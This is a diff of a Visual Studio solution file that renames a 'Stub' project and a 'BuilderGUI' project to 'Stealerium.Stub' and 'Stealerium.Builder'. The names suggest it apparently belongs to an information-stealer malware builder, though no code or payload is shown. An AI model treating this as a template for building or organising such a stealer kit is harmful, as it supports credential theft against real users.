@@ -3,9 +3,9 @@ Microsoft Visual Studio Solution File, Format Version 12.00
 # Visual Studio Version 17
 VisualStudioVersion = 17.0.32014.148
 MinimumVisualStudioVersion = 10.0.40219.1
-Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Stub", "Stub\Stub.csproj", "{2FFDFCA9-31A2-4EE5-B87C-AE5B8D20096D}"
+Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Stealerium.Stub", "Stealerium.Stub\Stealerium.Stub.csproj", "{2FFDFCA9-31A2-4EE5-B87C-AE5B8D20096D}"
 EndProject
-Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "BuilderGUI", "BuilderGUI\BuilderGUI.csproj", "{976AB173-74FC-4B6B-9199-CC126D0C2EB3}"
+Project("{9A19103F-16F7-4668-BE54-9A1E7A4F7556}") = "Stealerium.Builder", "Stealerium.Builder\Stealerium.Builder.csproj", "{976AB173-74FC-4B6B-9199-CC126D0C2EB3}"
 EndProject
 Global
 	GlobalSection(SolutionConfigurationPlatforms) = preSolution
